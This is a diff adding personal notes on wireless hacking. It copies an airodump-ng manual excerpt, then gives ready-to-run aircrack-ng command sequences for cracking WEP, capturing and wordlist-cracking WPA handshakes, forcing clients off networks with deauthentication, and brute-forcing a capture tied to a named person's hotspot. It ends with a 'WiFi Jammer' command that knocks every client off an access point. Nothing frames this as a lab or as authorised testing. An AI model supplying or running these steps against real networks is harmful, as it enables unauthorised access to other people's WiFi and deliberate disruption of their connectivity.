@@ -1,0 +1,129 @@
+Wireless Security
+-----------------
+
+Wireless Technology
+-------------------
+	WiFi --> Wireless Fidility
+	Bluetooth
+	RFID
+
+	IEEE 802.11(a|b|n)
+	------------------
+		This is set of standards, which tells me the following things
+			-- Number Of devices that can connect
+			-- Maximun Data Transmission Speed
+			-- Protocols Support
+			-- Area Cover
+
+	WiFi
+	====
+		1. WEP
+		2. WPA|WPA2
+
+BSSID  MAC address of the access point. In the Client section, a BSSID of "(not associated)" means that the client
+              is not associated with any AP. In this unassociated state, it is searching for an AP to connect with.
+
+       PWR    Signal  level  reported by the card. Its signification depends on the driver, but as the signal gets higher
+              you get closer to the AP or the station. If the BSSID PWR is -1, then the  driver  doesn't  support  signal
+              level  reporting.  If  the  PWR is -1 for a limited number of stations then this is for a packet which came
+              from the AP to the client but the client transmissions are out of range for  your  card.  Meaning  you  are
+              hearing only 1/2 of the communication. If all clients have PWR as -1 then the driver doesn't support signal
+              level reporting.
+
+       RXQ    Only shown when on a fixed channel. Receive Quality as measured by the percentage  of  packets  (management
+              and data frames) successfully received over the last 10 seconds. It's measured over all management and data
+              frames. That's the clue, this allows you to read more things out of this value. Lets say you got  100  per‐
+              cent  RXQ and all 10 (or whatever the rate) beacons per second coming in. Now all of a sudden the RXQ drops
+              below 90, but you still capture all sent beacons. Thus you know that the AP is sending frames to  a  client
+              but  you  can't  hear the client nor the AP sending to the client (need to get closer). Another thing would
+              be, that you got a 11MB card to monitor and capture frames (say a prism2.5) and you have a very good  posi‐
+              tion  to  the  AP. The AP is set to 54MBit and then again the RXQ drops, so you know that there is at least
+              one 54MBit client connected to the AP.
+
+       Beacons
+              Number of beacons sent by the AP. Each access point sends about ten beacons per second at the  lowest  rate
+              (1M), so they can usually be picked up from very far.
+
+       #Data  Number of captured data packets (if WEP, unique IV count), including data broadcast packets.
+
+       #/s    Number of data packets per second measure over the last 10 seconds.
+
+       CH     Channel  number  (taken from beacon packets). Note: sometimes packets from other channels are captured even
+              if airodump-ng is not hopping, because of radio interference.
+
+       MB     Maximum speed supported by the AP. If MB = 11, it's 802.11b, if MB = 22 it's 802.11b+ and higher rates  are
+              802.11g. The dot (after 54 above) indicates short preamble is supported. 'e' indicates that the network has
+              QoS (802.11e) enabled.
+
+       ENC    Encryption algorithm in use. OPN = no encryption,"WEP?" = WEP or higher (not enough data to choose  between
+              WEP and WPA/WPA2), WEP (without the question mark) indicates static or dynamic WEP, and WPA or WPA2 if TKIP
+              or CCMP or MGT is present.
+
+       CIPHER The cipher detected. One of CCMP, WRAP, TKIP, WEP, WEP40, or WEP104. Not mandatory, but TKIP  is  typically
+              used  with  WPA and CCMP is typically used with WPA2. WEP40 is displayed when the key index is greater then
+              0. The standard states that the index can be 0-3 for 40bit and should be 0 for 104 bit.
+
+       AUTH   The authentication protocol used. One of MGT (WPA/WPA2 using a separate authentication server), SKA (shared
+              key for WEP), PSK (pre-shared key for WPA/WPA2), or OPN (open for WEP).
+
+       WPS    This is only displayed when --wps (or -W) is specified. If the AP supports WPS, the first field of the col‐
+              umn indicates version supported. The second field indicates WPS  config  methods  (can  be  more  than  one
+              method,  separated  by  comma):  USB  = USB method, ETHER = Ethernet, LAB = Label, DISP = Display, EXTNFC =
+              External NFC, INTNFC = Internal NFC, NFCINTF = NFC Interface, PBC = Push Button, KPAD =  Keypad. Locked  is
+              displayed when AP setup is locked.
+
+       ESSID  The so-called "SSID", which can be empty if SSID hiding is activated. In this case, airodump-ng will try to
+              recover the SSID from probe responses and association requests.
+
+
+WEP
+===
+#iwconfig
+#airmon-ng 
+#airmon-ng start wlan0
+#iwconfig
+#airodump-ng wlan0mon
+	bssid 				channel number
+#airodump-ng --bssid <Target's BSSID> -c <Target's Channel Number> -w <File Name In Which I want To Capture the Beacons --> aranjit> wlan0mon
+	Wait until the beacons number reaches to 25,000
+#aircrack-ng aranjit-01.cap
+
+WPA|WPA2
+========
+When there is a new device connecting
+-------------------------------------
+#iwconfig
+#airmon-ng 
+#airmon-ng start wlan0
+#iwconfig
+#airodump-ng wlan0mon
+	bssid 				channel number
+#airodump-ng --bssid <Target's BSSID> -c <Target's Channel Number> -w <File Name In Which I want To Capture the Beacons --> aranjit> wlan0mon
+	It will help you to get the WPA handshake
+#aircrack-ng -w /usr/share/wordlists/rockyou.txt aranjit-01.cap
+
+
+When there is no new device connecting
+-------------------------------------
+#iwconfig
+#airmon-ng 
+#airmon-ng start wlan0
+#iwconfig
+#airodump-ng wlan0mon
+	bssid 				channel number
+#airodump-ng --bssid <Target's BSSID> -c <Target's Channel Number> -w <File Name In Which I want To Capture the Beacons --> aranjit> wlan0mon
+	It will help you to get the WPA handshake
+#aireplay-ng -0 10 -a <Router's BSSID> -c <Station's BSSID> wlan0mon
+	This will make us capture the handshake
+#aircrack-ng -w /usr/share/wordlists/rockyou.txt aranjit-01.cap
+
+
+Brute Force
+-----------
+#john --incremental --stdout | aircrack-ng -e "Shubhasmit's iPhone" -w- filename-01.cap
+	Where filename-01.cap is the file created using airodump-ng.
+
+
+WiFi Jammer
+===========
+#aireplay-ng -0 0 -a <Router's BSSID> -c FF:FF:FF:FF:FF:FF wlan0mon
